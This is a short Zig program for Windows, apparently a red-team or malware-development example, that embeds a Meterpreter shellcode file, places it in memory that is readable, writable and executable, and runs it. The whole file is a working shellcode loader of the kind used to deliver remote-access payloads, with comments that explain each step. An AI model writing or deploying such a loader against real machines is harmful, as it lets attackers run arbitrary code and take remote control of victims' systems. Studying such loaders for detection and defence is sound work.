const std = @import("std");
const win32 = @import("win32");

const VirtualAlloc = win32.system.memory.VirtualAlloc;

const VIRTUAL_ALLOCATION_TYPE = win32.system.memory.VIRTUAL_ALLOCATION_TYPE;
const PAGE_EXECUTE_READWRITE = win32.system.memory.PAGE_EXECUTE_READWRITE;

pub fn main() !void {
    // We include the compile as a string at compile time
    const shellcode = @embedFile("meterpreter.bin");
    // Allocate RWX memory for the shellcode -- note that shellcode.len is a constant known at compile time, so we can use it
    const allocated_memory_ptr: [*]u8 = @ptrCast(VirtualAlloc(null, shellcode.len, VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1 }, PAGE_EXECUTE_READWRITE).?);
    // We copy the shellcode to the memory.
    @memcpy(allocated_memory_ptr, shellcode);
    // Cast the RWX memory to a function pointer and then call it.
    const shellcode_fn: *const fn () void = @ptrCast(allocated_memory_ptr);
    shellcode_fn();
}
